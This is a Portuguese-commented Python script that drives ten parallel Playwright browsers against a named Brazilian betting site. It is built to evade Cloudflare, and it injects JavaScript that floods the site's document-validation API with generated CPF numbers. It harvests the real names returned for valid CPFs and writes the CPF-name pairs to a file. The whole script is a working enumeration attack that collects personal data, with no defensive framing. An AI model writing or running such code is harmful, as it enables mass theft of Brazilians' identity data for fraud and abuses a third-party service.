#!/usr/bin/env python3
"""
Injetor Multi-Processo - Máximo paralelismo
Cada processo tem seu próprio browser
"""
import random
import time
import multiprocessing
from multiprocessing import Process, Queue
from playwright.sync_api import sync_playwright

NUM_PROCESSOS = 10
REQUESTS_POR_PROCESSO = 100

def gerar_cpfs(n):
    cpfs = []
    for _ in range(n):
        cpf = [random.randint(0, 9) for _ in range(9)]
        soma = sum((10 - i) * cpf[i] for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        soma = sum((11 - i) * cpf[i] for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        cpfs.append(''.join(map(str, cpf)))
    return cpfs

def worker_processo(proc_id, cpfs, result_queue):
    """Cada processo tem seu próprio browser"""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)  # Visível para bypass Cloudflare
            page = browser.new_page()
            
            # Navega
            page.goto("https://7k.bet.br/", wait_until="networkidle", timeout=60000)
            time.sleep(5)
            
            # Injeta JS
            page.evaluate("""() => {
                window.stats = {ok: 0, validos: [], blocked: 0, erro: 0};
                
                window.validarCPF = async (cpf) => {
                    try {
                        const r = await fetch('/api/documents/validate', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({number: cpf, type: 'cpf'})
                        });
                        if (r.status === 200) {
                            const data = await r.json();
                            window.stats.ok++;
                            window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                        } else if (r.status === 400) {
                            window.stats.ok++;
                        } else if (r.status === 403) {
                            window.stats.blocked++;
                        } else {
                            window.stats.erro++;
                        }
                    } catch (e) {
                        window.stats.erro++;
                    }
                };
                
                window.blast = async (cpfs) => {
                    await Promise.all(cpfs.map(cpf => window.validarCPF(cpf)));
                    return window.stats;
                };
            }""")
            
            # BLAST!
            inicio = time.time()
            stats = page.evaluate("cpfs => window.blast(cpfs)", cpfs)
            tempo = time.time() - inicio
            
            browser.close()
            
            result_queue.put({
                "proc_id": proc_id,
                "ok": stats["ok"],
                "validos": stats["validos"],
                "blocked": stats["blocked"],
                "erro": stats["erro"],
                "tempo": tempo
            })
            
    except Exception as e:
        result_queue.put({
            "proc_id": proc_id,
            "ok": 0,
            "validos": [],
            "blocked": 0,
            "erro": len(cpfs),
            "tempo": 0,
            "error": str(e)[:50]
        })

def main():
    total = NUM_PROCESSOS * REQUESTS_POR_PROCESSO
    
    print("="*65)
    print(f"🚀 MULTI-PROCESSO - {NUM_PROCESSOS} BROWSERS PARALELOS")
    print("="*65)
    print(f"   Processos: {NUM_PROCESSOS}")
    print(f"   Requisições por processo: {REQUESTS_POR_PROCESSO}")
    print(f"   Total: {total}")
    
    # Gera CPFs
    print(f"\n📝 Gerando {total} CPFs...")
    all_cpfs = [gerar_cpfs(REQUESTS_POR_PROCESSO) for _ in range(NUM_PROCESSOS)]
    
    # Queue para resultados
    result_queue = Queue()
    
    # Inicia processos
    print(f"\n🚀 Iniciando {NUM_PROCESSOS} processos...")
    
    inicio = time.time()
    
    processos = []
    for i in range(NUM_PROCESSOS):
        p = Process(target=worker_processo, args=(i, all_cpfs[i], result_queue))
        processos.append(p)
        p.start()
        print(f"   Processo {i+1}/{NUM_PROCESSOS} iniciado")
    
    print(f"\n⏳ Aguardando conclusão...")
    
    # Aguarda todos
    for p in processos:
        p.join()
    
    tempo_total = time.time() - inicio
    
    # Coleta resultados
    print(f"\n📊 Coletando resultados...")
    
    total_ok = 0
    total_blocked = 0
    total_erro = 0
    all_validos = []
    
    while not result_queue.empty():
        result = result_queue.get()
        proc_id = result["proc_id"]
        total_ok += result["ok"]
        total_blocked += result["blocked"]
        total_erro += result["erro"]
        all_validos.extend(result["validos"])
        
        if "error" in result:
            print(f"   Processo {proc_id+1}: ERRO - {result['error']}")
        else:
            print(f"   Processo {proc_id+1}: OK={result['ok']}, Válidos={len(result['validos'])}, Tempo={result['tempo']:.1f}s")
    
    print("\n" + "="*65)
    print("📊 RELATÓRIO FINAL - MULTI-PROCESSO")
    print("="*65)
    print(f"   Processos: {NUM_PROCESSOS}")
    print(f"   Total requisições: {total}")
    print(f"   Tempo total: {tempo_total:.1f}s")
    print(f"\n   ⚡ VELOCIDADE: {total/tempo_total:.1f} req/s")
    print(f"\n   ✅ OK: {total_ok}")
    print(f"   🎯 Válidos: {len(all_validos)}")
    print(f"   🚫 Blocked: {total_blocked}")
    print(f"   💥 Erros: {total_erro}")
    
    if all_validos:
        print(f"\n🎯 CPFs VÁLIDOS ({len(all_validos)}):")
        for v in all_validos[:30]:
            cpf = v['cpf']
            print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
        
        with open("cpfs_multiproc.txt", "w", encoding="utf-8") as f:
            for v in all_validos:
                cpf = v['cpf']
                f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
        print(f"\n💾 Salvos em cpfs_multiproc.txt")
    
    print("\n" + "="*65)
    print(f"✅ CONCLUÍDO: {total/tempo_total:.1f} req/s com {NUM_PROCESSOS} processos")
    print("="*65)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()

